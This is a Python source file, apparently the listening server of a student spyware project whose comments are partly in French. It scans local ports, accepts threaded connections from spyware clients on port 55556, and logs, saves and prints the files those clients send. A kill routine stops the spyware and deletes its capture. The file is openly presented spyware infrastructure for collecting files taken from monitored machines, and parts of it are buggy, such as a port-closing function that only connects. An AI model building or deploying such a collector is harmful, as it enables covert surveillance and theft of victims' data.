"""
LIEN GIT : https://github.com/mariam-rg/Spyware-Python-.git
"""
import psutil
import socket
import threading
import os
import subprocess
import CLT


#Server configuration
SERVER_HOST = '127.0.0.1'
SERVER_PORT = 55556

BUFFER_SIZE = 1024


#Dictionary to store client IDs and connections
CLIENT_FILE_DAY = {}

#Array with all open ports
PORTS = []


#Scanner les ports ouverts sur la machine
def allOpenPorts():
    open_ports = []
    for port in range(1, 1025):  #Exemple : Scanner les ports de 1 à 1024
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex(('localhost', port))
        if result == 0:
            open_ports.append(port)
        sock.close()
    return open_ports

#Ecouter sur un port spécifique
def listenPort(port):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('localhost', port))
    server_socket.listen(5)
    print(f"En attente de connexions sur le port {port}")
    client_socket, addr = server_socket.accept()
    print(f"Connexion acceptée de {addr}")

#Fermer une connexion sur le port 
def closePort(port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        sock.connect(('localhost', port))
        sock.close()
        print(f"Connexion fermée sur le port {port}")
    except Exception as e:
        print(f"Erreur lors de la fermeture du port {port}: {e}")

#Fermer toutes les connexions sur tous les ports ouverts
def closeAllPort():
    for port in range(1, 1025):
        closePort(port)

#Fonction de --kill pour arrêter le serveur 
def kill():
    try:
        #Fermer tous les ports sur lesquels le serveur écoute
        for process in psutil.process_iter(['pid', 'name']):
            if SERVER_HOST in process.info['name'].lower():  
                print(f"Arrêt du processus {process.info['pid']}")
                process.send_signal(psutil.signal.SIGTERM)
        
        #Arrêter toutes les instances du serveur en cours
        subprocess.run(['pkill', '-f', SERVER_HOST])

        file=CLT.writeFile()
        #Avertir le spyware de s'arrêter
        subprocess.run(['pkill', '-f', file])


        #Supprimer la capture
        
        os.remove(file)  
        print("Capture supprimée avec succès.")
        
        print("Opérations terminées avec succès.")
    except Exception as e:
        print(f"Erreur lors de l'arrêt : {e}")

#Fonction d'aide affichant tout les fonctions disponible 
def help():
    print("Fonctions disponibles :")
    print("- allOpenPorts(): Cette fonction retourne une liste de tous les ports ouverts.")
    print("- listenPort(port): Cette fonction écoute sur un port spécifique pour les connexions entrantes.")
    print("- closePort(port): Cette fonction ferme une connexion sur un port spécifique.")
    print("- closeAllPort(): Cette fonction ferme toutes les connexions sur tous les ports ouverts.")


#Ajouter un fichier à la liste des fichiers d'un client
def addFileDirectory(IDClient, nameFile):
    global CLIENT_FILE_DAY
    if IDClient in CLIENT_FILE_DAY:
        CLIENT_FILE_DAY[IDClient].append(nameFile)
    else:
        CLIENT_FILE_DAY[IDClient] = [nameFile]

"""
Display all files sent to SERVER coming from one Client in particular
"""


#Afficher les fichiers d'un client particulier
def displayFileClientDay(IDClient):
    if IDClient in CLIENT_FILE_DAY:
        filesClient = CLIENT_FILE_DAY[IDClient]
        print(filesClient)
    else:
        print("ID Client has not been found\n")

""""""

#equivalent to '--show' pour afficher tous les fichiers reçus par le serveur
def displayAllFileDay():
    print("Listing all files received this connection:")
    for IDClient, files in CLIENT_FILE_DAY.items():
        print("Client ID:", IDClient)
        print("Files:")
        for nameFile in files:
            print("\t", nameFile)
    print("End listing all files\n")




#Recevoir un fichier d'un client
def receiveFile(data):
    print("[*] Receive a file from a client")


#Lire les commandes de l'utilisateur
def inputServer():
    i = input(f"SERVER > (écrire --listen) ")
    if i == "--listen":
        connectClients()


#Sauvegarder un fichier reçu
def saveFile(IDClient, fileContent):
    nameFile = "Test_File.txt"
    try:
        with open(nameFile, 'wb') as f:
            f.write(fileContent)
        print(f"File {nameFile} has been saved successfully\n")
        readFile(nameFile)
    except Exception as e:
        print(f"An error occurred saving file : {e}")

#Lire le contenu du fichier recu
def readFile(fileName):
    with open(fileName, 'rb') as f:
        print("+++ BEGINNING +++")
        file_contents = f.read()
        print(file_contents.decode())
        print("+++ END +++\n")


#Gérer la communication avec un client
def manageClient(clientSocket, address):
    global CLIENT_FILE_DAY
    print(f"[*] Accepted connection from {address}")
    IPClient = address[0]
    try:
         IDClient = clientSocket.recv(BUFFER_SIZE)
         print(f"ID client: {IDClient.decode()}\n")
         clientSocket.sendall(b"ID client received")
         while True:
            data = clientSocket.recv(BUFFER_SIZE)
            if not data:
                break

            nameFile, fileContent = data.split(b"\n", 1)
            addFileDirectory(IDClient, nameFile.decode())
            displayAllFileDay()
            
            saveFile(IDClient, fileContent)
            clientSocket.sendall(b"File '" + nameFile + b"' received") 
    except ConnectionResetError:
        print(f"[*] Connection from {IPClient} ({address}) closed unexpectedly.")
    except Exception as e:
        print(f"[*] An error occurred while receiving data: {e}")

    clientSocket.close()
    print(f"[*] Connection from {IPClient} ({address}) closed.")


#Accepter les connexions des clients
def connectClients():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((SERVER_HOST, SERVER_PORT))
        s.listen(5)
        print(f"[*] Listening on {SERVER_HOST}:{SERVER_PORT}..")

        while True:
            #Accept a new connection from client
            clientSocket, clientAddress = s.accept()

            #Start a new thread to manage client
            threadClient = threading.Thread(target=manageClient, args=(clientSocket, clientAddress))
            threadClient.start()


def main():
    #connectClients()
    inputServer()
    help()
    kill()



if __name__ == "__main__":
    main()